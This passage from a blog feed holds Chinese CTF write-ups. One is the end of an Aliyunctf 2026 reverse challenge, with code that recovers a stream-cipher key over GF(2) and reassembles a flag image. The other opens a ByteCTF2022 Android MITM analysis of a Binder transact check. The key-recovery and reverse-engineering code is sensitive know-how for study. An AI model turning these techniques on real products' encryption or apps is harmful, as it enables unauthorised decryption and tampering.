class_">byte</span>[n]; <span class="comment">// 全零</span></span><br><span class="line">      <span class="type">byte</span>[] out = Runner.encrypt(algo, data, key);</span><br><span class="line">      <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">byte</span> b : out) sb.append(String.format(<span class="string">&quot;%02x&quot;</span>, b));</span><br><span class="line">      System.out.print(sb.toString());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="type">byte</span>[] hexToBytes(String h)&#123;</span><br><span class="line">      <span class="type">byte</span>[] out=<span class="keyword">new</span> <span class="title class_">byte</span>[h.length()/<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;out.length;i++)&#123;</span><br><span class="line">          <span class="type">int</span> hi=Character.digit(h.charAt(i*<span class="number">2</span>),<span class="number">16</span>);</span><br><span class="line">          <span class="type">int</span> lo=Character.digit(h.charAt(i*<span class="number">2</span>+<span class="number">1</span>),<span class="number">16</span>);</span><br><span class="line">          out[i]=(<span class="type">byte</span>)((hi&lt;&lt;<span class="number">4</span>)|lo);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> out;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 GF(2) 解 key</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">algo = <span class="string">&#x27;l1I_decoded_0.bin&#x27;</span></span><br><span class="line">L = <span class="number">256</span></span><br><span class="line"></span><br><span class="line">cipher = Path(<span class="string">&#x27;stream1_encdata.bin&#x27;</span>).read_bytes()</span><br><span class="line">plain  = Path(<span class="string">&#x27;pps.lzrr&#x27;</span>).read_bytes()</span><br><span class="line">obs = <span class="built_in">bytes</span>(c^p <span class="keyword">for</span> c,p <span class="keyword">in</span> <span class="built_in">zip</span>(cipher[:<span class="built_in">len</span>(plain)], plain))[:L]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ks</span>(<span class="params">keyhex, n=L</span>):</span><br><span class="line">  out = subprocess.check_output(</span><br><span class="line">      [<span class="string">&#x27;java&#x27;</span>,<span class="string">&#x27;-classpath&#x27;</span>,<span class="string">&#x27;extracted_classes:.&#x27;</span>,<span class="string">&#x27;DumpKS&#x27;</span>,algo,<span class="built_in">str</span>(n),keyhex],</span><br><span class="line">      text=<span class="literal">True</span>).strip()</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>.fromhex(out)</span><br><span class="line"></span><br><span class="line">s0 = ks(<span class="string">&#x27;0000000000000000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">basis_bits = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">  kb = [<span class="number">0</span>]*<span class="number">8</span>; kb[i//<span class="number">8</span>] = <span class="number">1</span> &lt;&lt; (i%<span class="number">8</span>)</span><br><span class="line">  keyhex = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> kb)</span><br><span class="line">  s = ks(keyhex)</span><br><span class="line">  b = <span class="built_in">bytes</span>(a^b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(s,s0))</span><br><span class="line">  bits = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> idx, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(b):</span><br><span class="line">      <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">          <span class="keyword">if</span> byte &amp; (<span class="number">1</span>&lt;&lt;bit):</span><br><span class="line">              bits |= <span class="number">1</span> &lt;&lt; (idx*<span class="number">8</span>+bit)</span><br><span class="line">  basis_bits.append(bits)</span><br><span class="line"></span><br><span class="line">trg = <span class="built_in">bytes</span>(a^b <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(obs, s0))</span><br><span class="line">rows = []</span><br><span class="line"><span class="keyword">for</span> bit_idx <span class="keyword">in</span> <span class="built_in">range</span>(L*<span class="number">8</span>):</span><br><span class="line">  coeff = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">      <span class="keyword">if</span> (basis_bits[i] &gt;&gt; bit_idx) &amp; <span class="number">1</span>:</span><br><span class="line">          coeff |= <span class="number">1</span>&lt;&lt;i</span><br><span class="line">  rhs = (trg[bit_idx//<span class="number">8</span>] &gt;&gt; (bit_idx%<span class="number">8</span>)) &amp; <span class="number">1</span></span><br><span class="line">  <span class="keyword">if</span> coeff: rows.append([coeff, rhs])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 高斯消元</span></span><br><span class="line">row=<span class="number">0</span>; where=[-<span class="number">1</span>]*<span class="number">64</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">  pivot = <span class="built_in">next</span>((r <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(row,<span class="built_in">len</span>(rows)) <span class="keyword">if</span> (rows[r][<span class="number">0</span>]&gt;&gt;col)&amp;<span class="number">1</span>), <span class="literal">None</span>)</span><br><span class="line">  <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>: <span class="keyword">continue</span></span><br><span class="line">  rows[row], rows[pivot] = rows[pivot], rows[row]</span><br><span class="line">  where[col]=row</span><br><span class="line">  <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(rows)):</span><br><span class="line">      <span class="keyword">if</span> r!=row <span class="keyword">and</span> ((rows[r][<span class="number">0</span>]&gt;&gt;col)&amp;<span class="number">1</span>):</span><br><span class="line">          rows[r][<span class="number">0</span>]^=rows[row][<span class="number">0</span>]; rows[r][<span class="number">1</span>]^=rows[row][<span class="number">1</span>]</span><br><span class="line">  row+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">key_bits=[<span class="number">0</span>]*<span class="number">64</span></span><br><span class="line"><span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">  <span class="keyword">if</span> where[col]!=-<span class="number">1</span>:</span><br><span class="line">      key_bits[col]=rows[where[col]][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">key_bytes=[<span class="number">0</span>]*<span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> i,b <span class="keyword">in</span> <span class="built_in">enumerate</span>(key_bits):</span><br><span class="line">  <span class="keyword">if</span> b: key_bytes[i//<span class="number">8</span>]|=<span class="number">1</span>&lt;&lt;(i%<span class="number">8</span>)</span><br><span class="line">keyhex=<span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;b:02x&#125;</span>&#x27;</span> <span class="keyword">for</span> b <span class="keyword">in</span> key_bytes)</span><br><span class="line"><span class="built_in">print</span>(keyhex)  <span class="comment"># a91b1bb4e8978bda</span></span><br></pre></td></tr></table></figure><p>用 key 解密 batch2，解压出 Image1Part2&#x2F;4.java如下所示的到，啊</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Image1Part2</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">IMAGE_DATA</span> <span class="operator">=</span> <span class="string">&quot;......;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    public static void main(String[] args) throws Exception &#123;</span></span><br><span class="line"><span class="string">        byte[] imageBytes = Base64.getDecoder().decode(IMAGE_DATA);</span></span><br><span class="line"><span class="string">        try (FileOutputStream fos = new FileOutputStream(&quot;</span>flag.jpg<span class="string">&quot;)) &#123;</span></span><br><span class="line"><span class="string">            fos.write(imageBytes);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        System.out.println(&quot;</span>Image saved to flag.jpg<span class="string">&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p>从 6 个 Java 文件提取 base64 JPEG，拼接得到完整 flag.jpg</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, re</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取各 part 的 base64</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">  text = Path(<span class="string">f&#x27;extracted_files/flagImage/Image1Part<span class="subst">&#123;i&#125;</span>.java&#x27;</span>).read_text()</span><br><span class="line">  b64 = re.search(<span class="string">r&#x27;IMAGE_DATA\\s*=\\s*\&quot;([^\&quot;]+)\&quot;&#x27;</span>, text).group(<span class="number">1</span>)</span><br><span class="line">  Path(<span class="string">f&#x27;flag_images/part<span class="subst">&#123;i&#125;</span>.jpg&#x27;</span>).write_bytes(base64.b64decode(b64))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拼接成完整 flag</span></span><br><span class="line">parts=[Image.<span class="built_in">open</span>(<span class="string">f&#x27;flag_images/part<span class="subst">&#123;i&#125;</span>.jpg&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>)]</span><br><span class="line">w=<span class="built_in">sum</span>(p.width <span class="keyword">for</span> p <span class="keyword">in</span> parts); h=<span class="built_in">max</span>(p.height <span class="keyword">for</span> p <span class="keyword">in</span> parts)</span><br><span class="line">out=Image.new(<span class="string">&#x27;RGB&#x27;</span>,(w,h))</span><br><span class="line">x=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> parts:</span><br><span class="line">  out.paste(p,(x,<span class="number">0</span>)); x+=p.width</span><br><span class="line">out.save(<span class="string">&#x27;flag_images/flag.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p> <img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/9e57a92d-f1a3-42e2-939c-bfeef275a0bf.png" title=" =1000x543"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Aliyunctf-2026-re&quot;&gt;&lt;a href=&quot;#Aliyunctf-2026-re&quot; class=&quot;headerlink&quot; title=&quot;Aliyunctf 2026 re&quot;&gt;&lt;/a&gt;Aliyunctf 2026 re&lt;/h1&gt;&lt;h2 id=&quot;licen</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>ByteCTF2022 MITM分析</title>
    <link href="http://matriy330.github.io/98161e65/"/>
    <id>http://matriy330.github.io/98161e65/</id>
    <published>2026-02-04T08:20:37.000Z</published>
    <updated>2026-02-04T08:20:38.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ByteCTF2022-MITM分析"><a href="#ByteCTF2022-MITM分析" class="headerlink" title="ByteCTF2022 MITM分析"></a>ByteCTF2022 MITM分析</h1><h2 id="APK分析"><a href="#APK分析" class="headerlink" title="APK分析"></a>APK分析</h2><h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>之前介绍过</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260123225015365.png" alt="mode"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">manifest</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span> <span class="attr">android:versionCode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">android:versionName</span>=<span class="string">&quot;1.0&quot;</span> <span class="attr">android:compileSdkVersion</span>=<span class="string">&quot;32&quot;</span> <span class="attr">android:compileSdkVersionCodename</span>=<span class="string">&quot;12&quot;</span> <span class="attr">package</span>=<span class="string">&quot;com.bytedance.mitm&quot;</span> <span class="attr">platformBuildVersionCode</span>=<span class="string">&quot;32&quot;</span> <span class="attr">platformBuildVersionName</span>=<span class="string">&quot;12&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">uses-sdk</span> <span class="attr">android:minSdkVersion</span>=<span class="string">&quot;27&quot;</span> <span class="attr">android:targetSdkVersion</span>=<span class="string">&quot;32&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">application</span> <span class="attr">android:theme</span>=<span class="string">&quot;@style/Theme.MITM&quot;</span> <span class="attr">android:label</span>=<span class="string">&quot;@string/app_name&quot;</span> <span class="attr">android:icon</span>=<span class="string">&quot;@mipmap/ic_launcher&quot;</span> <span class="attr">android:debuggable</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:allowBackup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:supportsRtl</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:extractNativeLibs</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:fullBackupContent</span>=<span class="string">&quot;@xml/backup_rules&quot;</span> <span class="attr">android:roundIcon</span>=<span class="string">&quot;@mipmap/ic_launcher_round&quot;</span> <span class="attr">android:appComponentFactory</span>=<span class="string">&quot;androidx.core.app.CoreComponentFactory&quot;</span> <span class="attr">android:dataExtractionRules</span>=<span class="string">&quot;@xml/data_extraction_rules&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.bytedance.mitm.MainActivity&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:launchMode</span>=<span class="string">&quot;singleInstance&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.MAIN&quot;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.startup.InitializationProvider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.bytedance.mitm.androidx-startup&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.emoji2.text.EmojiCompatInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;androidx.lifecycle.ProcessLifecycleInitializer&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;androidx.startup&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="MainActivity"><a href="#MainActivity" class="headerlink" title="MainActivity"></a>MainActivity</h3><blockquote><p>MainActivity 中有一个check方法，通过反射拿到了activity_task 这个系统服务的IBinder对象 ，然后使用 transact 方法向该服务发送一个代表检查前台 Activity 屏幕兼容模式(getFrontActivityScreenCompatMode)的请求，请求码为 17。服务将发送响应，响应中包含一个整数值，表示前台 Activity 的屏幕兼容模式。如果该值等于 1337，则表示屏幕兼容模式符合要求，代码会发送一个名为 bytedance.ctf.androidmitm 的广播，广播附带了一个名为 flag 的字符串，其值为 “ByteCTF{xxx}” 。</p></blockquote><p><a href="https://blog.lleavesg.top/article/ByteCTF-2022-MITM#77b045e9ea004e44a80cf1d4fbb65a4e">ByteCTF2022 MITM复现 | LLeaves Blog</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.bytedance.mitm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.os.IBinder;</span><br><span class="line"><span class="keyword">import</span> android.os.Parcel;</span><br><span class="line"><span class="keyword">import</span> android.os.RemoteException;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes3.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;MAIN&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">check</span><span class="params">()</span> &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;Call ActivityTaskManagerService.getFrontActivityScreenCompatMode&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">IBinder</span> <span class="variable">am</span> <span class="operator">=</span> (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>).getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, <span class="string">&quot;activity_task&quot;</span>);</span><br><span class="line">            <span class="type">Parcel</span> <span class="variable">_data</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">            <span class="type">Parcel</span> <span class="variable">_reply</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">            _data.writeInterfaceToken(<span class="string">&quot;android.app.IActivityTaskManager&quot;</span>);</span><br><span class="line">            am.transact(<span class="number">17</span>, _data, _reply, <span class="number">0</span>);</span><br><span class="line">            _reply.readException();</span><br><span class="line">            <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> _reply.readInt();</span><br><span class="line">            Log.d(TAG, String.valueOf(result));</span><br><span class="line">            <span class="keyword">if</span> (result == <span class="number">1337</span>) &#123;</span><br><span class="line">                Log.d(TAG, <span class="string">&quot;Congrats!&quot;</span>);</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                intent.setAction(<span class="string">&quot;bytedance.ctf.androidmitm&quot;</span>);</span><br><span class="line">                intent.putExtra(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;ByteCTF&#123;xxx&#125;&quot;</span>);</span><br><span class="line">                sendBroadcast(intent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException | ClassNotFoundException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反射拿到系统服务的 Binder：activity_task</p><p>ServiceManager.getService(“activity_task”)：从系统的 ServiceManager 里取出名为 <strong>activity_task</strong> 的服务。</p><p>在Android 10+，很多 Activity&#x2F;Task 管理相关的系统能力在**ActivityTaskManagerService (ATMS)**。</p><table><thead><tr><th>缩写</th><th>全称</th><th>管什么</th><th>可以把它想成</th></tr></thead><tbody><tr><td><strong>AMS</strong></td><td>ActivityManagerService</td><td>进程 &amp; Activity 生命周期</td><td>Android 的进程总调度室</td></tr><tr><td><strong>ATMS</strong></td><td>ActivityTaskManagerService</td><td>Activity &#x2F; Task &#x2F; 栈</td><td>Activity 栈管理器</td></tr><tr><td><strong>PMS</strong></td><td>PackageManagerService</td><td>安装包 &amp; 权限</td><td>应用 &amp; 权限户口本</td></tr><tr><td><strong>WMS</strong></td><td>WindowManagerService</td><td>窗口 &amp; 显示</td><td>屏幕和窗口的导演</td></tr></tbody></table><p><strong>AMS 管的是进程级别的东西</strong>：</p><ul><li>App 进程的创建 &#x2F; 杀死</li><li>Activity &#x2F; Service &#x2F; Broadcast 的生命周期调度</li><li>ANR 监控</li><li>前后台进程管理</li><li>OOM_ADJ（谁先被杀）</li></ul><p>为什么有 ATMS？</p><p>Android 10以后：</p><ul><li>AMS <strong>太大了</strong></li><li>Activity &#x2F; Task &#x2F; 栈逻辑太复杂</li></ul><p>ATMS 管什么？</p><ul><li>Activity 启动 &#x2F; 切换</li><li>Task（任务栈）</li><li>前台 Activity</li><li>多窗口 &#x2F; 分屏</li><li>屏幕兼容模式（你题里的 <code>getFrontActivityScreenCompatMode</code>）</li></ul><p>PMS 是<strong>安全相关最重要的服务之一</strong>：</p><ul><li>APK 安装 &#x2F; 卸载</li><li><code>AndroidManifest.xml</code> 解析</li><li>权限授予 &#x2F; 校验</li><li>签名校验</li><li><code>queryIntentActivities</code></li><li><code>checkPermission</code></li></ul><p><strong>WMS 管的是屏幕上看到的一切</strong>：</p><ul><li>Window 的创建 &#x2F; 销毁</li><li>Activity 显示层级</li><li>Z-order（谁盖住谁）</li><li>Touch &#x2F; Key 分发</li><li>Surface 管理（和 SurfaceFlinger 配合）</li></ul><p>返回值是 <code>IBinder</code>：也就是这项系统服务的 Binder 通道，Activity、Service、ContentProvider通过Binder跨进程通信。</p><blockquote><p>为什么用反射？ServiceManager在 SDK 里属于隐藏&#x2F;限制访问的东西，直接调用容易被限制或编译报错。</p></blockquote><p>Parcel是 Binder IPC 的序列化容器</p><blockquote><p>RPC ⊂ IPC（RPC 是 IPC 的一种使用方式）IPC 解决怎么传，RPC 解决怎么用得像本地调用。</p></blockquote><p><a href="https://blog.csdn.net/sergeycao/article/details/52585411">transact和onTransact的区别-CSDN博客</a></p><p>writeInterfaceToken(“android.app.IActivityTaskManager”)：</p><ul><li>Binder 的一个安全&#x2F;一致性校验字段。</li><li>相当于是告诉系统是在按 IActivityTaskManager 这个接口的协议在说话</li></ul><blockquote><p>它相当于Binder 的接口身份证。</p></blockquote><p>如果 token 不对，系统通常会拒绝或抛异常</p><p>服务端会怎么用这个 token？</p><p>在 system_server 里，ATMS 的 <code>onTransact()</code> 一般是这样开头的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data.enforceInterface(DESCRIPTOR);</span><br></pre></td></tr></table></figure><p><code>enforceInterface()</code> 会做什么？</p><ol><li>从 <code>data</code> 里 <strong>读出你写的 token</strong></li><li>和自己的 <code>DESCRIPTOR</code> 比较</li><li>不一致 → 直接抛 <code>SecurityException</code></li></ol><p><strong>也就是说：token 不对，后面的代码根本不会执行</strong></p><p>android.app.IWindowManager过去直接会被拒绝</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">am.transact(<span class="number">17</span>, _data, _reply, <span class="number">0</span>);</span><br><span class="line">_reply.readException();</span><br><span class="line"><span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> _reply.readInt();</span><br></pre></td></tr></table></figure><p>向系统服务发起一次 Binder 调用（code&#x3D;17），等它处理完，如果没出错，就从返回包里读出一个 int 结果。</p><table><thead><tr><th>参数</th><th>含义</th></tr></thead><tbody><tr><td><code>am</code></td><td>远程系统服务的 Binder 代理（ATMS）</td></tr><tr><td><code>17</code></td><td><strong>transaction code</strong>（代表要调用的方法）</td></tr><tr><td><code>_data</code></td><td>请求数据包（参数）</td></tr><tr><td><code>_reply</code></td><td>返回数据包</td></tr><tr><td><code>0</code></td><td>flags（同步调用）</td></tr></tbody></table><blockquote><p>在 Binder 里：没有函数名,只认整数 code</p></blockquote><p>如何确定code&#x3D;17是getFrontActivityScreenCompatMode?</p><p>我们可看&#x2F;system&#x2F;framework&#x2F;services.jar</p><blockquote><p><strong>ServiceManager</strong> 是 Android 系统中 Binder 通信的核心部分，负责服务的注册和查询。它在 Android 系统启动时由 init 进程通过 rc 